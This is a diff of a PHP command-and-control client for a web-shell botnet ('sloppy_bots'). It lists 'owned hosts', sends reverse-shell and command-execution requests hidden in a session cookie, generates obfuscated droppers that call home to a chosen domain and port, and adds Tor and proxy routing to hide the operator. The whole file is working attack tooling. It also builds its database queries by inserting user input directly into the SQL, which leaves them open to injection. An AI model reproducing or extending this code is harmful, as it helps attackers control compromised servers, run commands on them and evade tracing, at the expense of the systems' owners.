@@ -1,4 +1,5 @@
 <?php
+define("CHH", curl_init());
 if (strtolower(php_uname()) == "windows") {
     define('clears', 'cls');
 } else {
@@ -54,12 +55,12 @@ if (empty(config['sloppy_db']['pass'])) {
         config['sloppy_db']['dbname']
     ));
 }
+
 if (config['sloppy_proxies']['proxy_init'] !== true){
     $firstRun->getProxies('initial');
 }else{
     echo "proxies built".PHP_EOL;
 }
-define("CHH", curl_init());
 
 
 function grab_proxy(string $schema, string $target_domain){
@@ -122,7 +123,8 @@ function logo($last, $cl, bool $error, $error_value, string $lastHost)
 function menu()
 {
     echo <<< _MENU
-        \e[0;32m(O)ptions                                                                   
+        \e[0;32m(O)ptions
+        (R)eset proxy                                                                   
         (Sys)tem enumeration                                                        
         (Rev)erse shell                                                             
         (Com)mand Execution                                                         
@@ -146,8 +148,6 @@ function b64(array $what, $how, string $whereWeGo)
 {
     // this function is currently causing the client to throw a 500 error.
     // will work though the issue and figure out a fix. but for now, this works... ish.
-    curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
-    curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
     curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
     curl_setopt(CHH, CURLOPT_POST, true);
     $our_nonce = openssl_random_pseudo_bytes(24);
@@ -396,15 +396,13 @@ function sys($host)
         $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
         $axX = pg_fetch_row($tc);
         curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1] . "?qs=cqBS");
-        curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
-        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
         $syst = curl_exec(CHH);
         if (!curl_errno(CHH)) {
             switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                 case 200:
                     logo('enumerate system', clears, false, '', $axX[0]);
-                    echo $syst;
+                    echo $syst.PHP_EOL;
                     break;
                 default:
                     logo('s', clears, true, "Resulted in a non response... ensure the server is still up or your connection is still good.", $axX[0].$axX[1]);
@@ -449,9 +447,6 @@ function rev($host, $port, $method, $callhome)
         }
         echo "[ ++ ] Trying: " . $axX[0] . " on " . $usePort . "[ ++ ]\n";
         $revCommand = base64_encode($useMethod . "." . $usePort . "." . $useShell. ".". $callbackhome);
-        curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1]);
-        curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
-        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
         curl_setopt(CHH, CURLOPT_POST, true);
         curl_setopt(CHH, CURLOPT_COOKIE, "jsessionid={$revCommand}");
@@ -502,8 +497,6 @@ function co($command, $host, bool $encrypt)
         $tcO = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
         $axX = pg_fetch_row($tcO);
         curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1]);
-        curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
-        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
         curl_setopt(CHH, CURLOPT_POST, true);
         curl_setopt(CHH, CURLOPT_COOKIE, "jsessionid={$space_Safe_coms}");
@@ -536,8 +529,6 @@ function clo($host, $repo, $uri)
         $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
         $axX = pg_fetch_row($tc);
         curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1]);
-        curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
-        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
         curl_setopt(CHH, CURLOPT_POST, true);
         curl_setopt(CHH, CURLOPT_POSTFIELDS, "clone=$repo");
@@ -595,7 +586,18 @@ function createDropper($callHome, $callhomePort, $duration, $obfsucate, $depth)
                     }
                     print("Generated dropper will be: {$ob}\n");
                     $rtValues = $t->begin_junk($file_in, $depth, $ob, "ob", $encrypt, $callHome, $callhomePort, $duration, $slop);
-                    pg_exec(pg_connect(DBCONN), sprintf("INSERT INTO sloppy_bots_droppers(location_on_disk, depth, obfuscated, check_in, aeskeys, xorkey) VALUES ('%s', '%s', '%s', '%s', '%s', '%s')", $rtValues['Output File'], $depth, $obfsucate, $duration, $rtValues['Key'] . "." . $rtValues['IV'] . "." . $rtValues['tag'], $rtValues['XOR Key']));
+                    pg_exec(pg_connect(DBCONN), sprintf("INSERT INTO sloppy_bots_droppers(location_on_disk, depth, obfuscated, check_in, aeskeys, chachakey, xorkey, checkindomain, checkinport, cookiename, cookievalue) VALUES ('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')",
+                        $rtValues['Output File'],
+                        $depth,
+                        $obfsucate,
+                        $duration,
+                        $rtValues['Key'] . "." . $rtValues['IV'] . "." . $rtValues['tag'],
+                        '',
+                        $rtValues['XOR Key'],
+                        $rtValues['CheckinDomain'],
+                        $rtValues['CheckinPort'],
+                        $rtValues['Cookie'],
+                        $rtValues['Cookie Value']));
                     $inDB->countUsedDomains($callHome);
                     system("ls -lah includes/droppers/dynamic/obfuscated");
                     print("\n\nPress M to return to the menu.\n");
@@ -658,20 +660,13 @@ function aHo($host, $os, $checkIn)
 
 function awesomeMenu(string $what)
 {
+    // this is quite messy, but will be refined later. its just in here for now.
     system(clears);
-    $sloppy_tables = array(
-        "tools" => "sloppy_bots_tools",
-        "loot" => "sloppy_bots_loot",
-        "domains" => "sloppy_bots_domains",
-        "droppers" => "sloppy_bots_droppers",
-        "main" => "sloppy_bots_main"
-    );
     switch ($what){
         case "hosts":
             $axx = pg_exec(pg_connect(DBCONN), "SELECT * FROM sloppy_bots_main");
             $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
-            echo str_repeat("+", 35) . "[ OWNED HOSTS ]" . str_repeat("+", 39) . "\n\n";
-            $a = 0;
+            echo str_repeat("+", 35) . "[ OWNED HOSTS ]" . str_repeat("+", 35) . "\n\n";
             foreach (pg_fetch_all($axx) as $tem => $use) {
                 print(sprintf("[ ID: ]-> %s [ RHOST: ]-> %s [ URI: ]-> %s [ OS_FLAVOR: ]-> %s [ CHECKED_IN: ]-> %s\n",
                     $use['id'],
@@ -684,6 +679,47 @@ function awesomeMenu(string $what)
             pg_free_result($count);
             pg_free_result($axx);
             echo "\n\n" . str_repeat("+", 35) . "[ END OWNED HOSTS ]" . str_repeat("+", 35) . "\n\n";
+            break;
+        case "proxies":
+            $schema = trim(readline('[ !! ] Which schema?(socks4/socks5/http)->'));
+            if (!empty($schema)){
+                $schema_to_use = sprintf("SELECT * FROM sloppy_bots_proxies WHERE proxy_schema = '%s' LIMIT %s", $schema, trim(readline("Limit(there are a ton in the db.)?")));
+            }else{
+                echo "Schema was empty, defaulting to socks4, with a limit of 10";
+                $schema_to_use = "SELECT * FROM sloppy_bots_proxies WHERE proxy_schema = 'socks4' LIMIT 10";
+            }
+            $axx = pg_exec(pg_connect(DBCONN), $schema_to_use);
+            echo str_repeat("+", 35) . "[ PROXIES ]" . str_repeat("+", 39) . "\n\n";
+            foreach (pg_fetch_all($axx) as $tem => $use) {
+                print(sprintf("[ ID: ]-> %s [ SCHEMA: ]-> %s [ PROXY: ]-> %s [ HOW MANY TIMES WE USED: ]-> %s [ LAST CONTACTED DOMAIN: ]-> %s\n",
+                    $use['id'],
+                    $use['proxy_schema'],
+                    $use['proxy'],
+                    $use['times_used'],
+                    $use['last_domain_contacted']
+                ));
+            }
+            pg_free_result($axx);
+            echo "\n\n" . str_repeat("+", 35) . "[ END PROXIES ]" . str_repeat("+", 35) . "\n\n";
+            return array(
+                "Proxy" => pg_fetch_row(pg_exec(pg_connect(DBCONN), sprintf("SELECT proxy FROM sloppy_bots_proxies WHERE id = '%s'", trim(readline("[ !! ] "))))),
+                "Schema" => $schema
+            );
+        case "droppers":
+            $axx = pg_exec(pg_connect(DBCONN), sprintf("SELECT * FROM sloppy_bots_droppers WHERE obfuscated = '%s' LIMIT %s", trim(readline('[ !! ] Encrypted? (y/n)->')), trim(readline("Limit(there are a ton in the db.)?"))));
+            echo str_repeat("+", 35) . "[ Droppers ]" . str_repeat("+", 39) . "\n\n";
+            foreach (pg_fetch_all($axx) as $tem => $use) {
+                print(sprintf("[ ID: ]-> %s [ Stored: ]-> %s [ Obfuscated: ]-> %s [ Checkin: ]-> %s [ Cookie Name: ]-> %s [ Cookie Value: ]-> %s\n",
+                    $use['id'],
+                    $use['location_on_disk'],
+                    $use['obfuscated'],
+                    $use['check_in'],
+                    $use['cookiename'],
+                    $use['cookievalue']
+                ));
+            }
+            pg_free_result($axx);
+            echo "\n\n" . str_repeat("+", 35) . "[ END Droppers ]" . str_repeat("+", 35) . "\n\n";
             break;
         default:
             print(str_repeat("+", 35)."[ -> {$what} in DB <- ]". str_repeat("+", 27)."\n");
@@ -713,8 +749,6 @@ function check($host, $path, $batch)
         $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
         $rows = pg_fetch_all(pg_exec(pg_connect(DBCONN), "SELECT check_in,rhost,uri FROM sloppy_bots_main WHERE rhost IS NOT NULL"));
         echo "Pulling: " . pg_fetch_result($count, null, null) . "\nThis could take awhile.";
-        curl_setopt(CHH, CURLOPT_TIMEOUT, 5);
-        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 5);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
         foreach ($rows as $r) {
             echo "\nTrying: {$r['rhost']}{$r['uri']}\n";
@@ -833,6 +867,36 @@ if (strstr(getcwd(), "slopShell") == true) {
     $homie = readline("Where is slopshell downloaded to?(full path)->");
     system("git pull {$homie}");
 }
+$proxy_set = null;
+$proxy_target = null;
+$curlopt_proxy_types = array(
+    "http" => CURLPROXY_HTTP,
+    "https" => CURLPROXY_HTTPS,
+    "socks4" => CURLPROXY_SOCKS4,
+    "socks5" => CURLPROXY_SOCKS5
+);
+echo PHP_EOL."As of right now, the only proxy that is working with no issue is tor.".PHP_EOL;
+echo PHP_EOL."Working on rotating proxies, and dynamically updating the proxy as we use this.".PHP_EOL;
+echo PHP_EOL."For now, tor is the only real way to work with this.".PHP_EOL;
+switch (strtolower(readline("Would you like to configure the proxies?(y/n/tor)"))){
+    case "y":
+        echo "Working on this part.".PHP_EOL;
+        $cho = awesomeMenu('proxies');
+        $proxy_set = "yes";
+        $proxy_target = $cho['Proxy'][0];
+        $proxy_schema = $cho['Schema'];
+        break;
+    case "n":
+        echo "working on this part too".PHP_EOL;
+        $proxy_set = "no";
+        break;
+    case "tor":
+        echo "working on this too".PHP_EOL;
+        $proxy_set = "tor";
+        $proxy_target = "127.0.0.1:9050";
+        $proxy_schema = $curlopt_proxy_types['socks4'];
+        break;
+}
 while ($run) {
     $h = null;
     $p = null;
@@ -843,13 +907,25 @@ while ($run) {
     $pw = null;
     curl_reset(CHH);
     try {
-        if (empty(config['sloppy_http']['proxy'])) {
+        if (is_null($proxy_set)) {
             echo "\e[0;31;40mPROXY NOT SET.\e[0m".PHP_EOL;
             curl_setopt(CHH, CURLOPT_USERAGENT, config['sloppy_http']['useragent']);
+            curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
+            curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
         } else {
-            echo "\e[0;32;40mProxy Set: " . config['sloppy_http']['proxy']."\e[0m".PHP_EOL;
+            echo "\e[0;32;40mProxy pointing to: " . $proxy_schema ."\e[0m".PHP_EOL;
             curl_setopt(CHH, CURLOPT_USERAGENT, config['sloppy_http']['useragent']);
-            curl_setopt(CHH, CURLOPT_PROXY, config['sloppy_http']["proxy"]);
+            if (!is_null($proxy_target)){
+                echo "\e[0;32;40mProxy Set: " . $proxy_target ."\e[0m".PHP_EOL;
+                if (strpos($proxy_schema, "http")) {
+                    curl_setopt(CHH, CURLOPT_HTTPPROXYTUNNEL, 1);
+                }
+                curl_setopt(CHH, CURLOPT_HEADER, 1);
+                curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 30);
+                curl_setopt(CHH, CURLOPT_TIMEOUT, 30);
+                curl_setopt(CHH, CURLOPT_PROXYTYPE, $proxy_schema);
+                curl_setopt(CHH, CURLOPT_PROXY, $proxy_target);
+            }
         }
         if (config['sloppy_http']['verify_ssl'] === "no") {
             curl_setopt(CHH, CURLOPT_SSL_VERIFYHOST, 0);
@@ -868,8 +944,44 @@ while ($run) {
     $lc = $pw;
     logo($lc, clears, "", "", '');
     switch (strtolower($pw)) {
+        case "r":
+            switch (strtolower(readline("Would you like to configure the proxies?(y/n/tor)"))){
+                case "y":
+                    $cho = awesomeMenu('proxies');
+                    $proxy_set = "yes";
+                    $proxy_target = $cho['Proxy'][0];
+                    $proxy_schema = $cho['Schema'];
+                    break;
+                case "n":
+                    echo "working on this part too".PHP_EOL;
+                    $proxy_set = "no";
+                    $proxy_target = null;
+                    $proxy_schema = null;
+                    break;
+                case "tor":
+                    echo "working on this too".PHP_EOL;
+                    $proxy_set = "tor";
+                    $proxy_target = "127.0.0.1:9050";
+                    $proxy_schema = "socks4";
+                    break;
+            }
+            break;
         case "lt":
-            awesomeMenu("tools");
+            $what_we_want = readline("[ ?? ] What are we looking for? (t/d/dr/proxy)->");
+            switch ($what_we_want){
+                case "t":
+                    awesomeMenu("tools");
+                    break;
+                case "d":
+                    awesomeMenu("domains");
+                    break;
+                case "dr":
+                    awesomeMenu("droppers");
+                    break;
+                case "proxy":
+                    awesomeMenu("proxies");
+                    break;
+            }
             break;
         case "at":
             $add = trim(readline("Do we need to add it to the db? (add/grab) -> "));
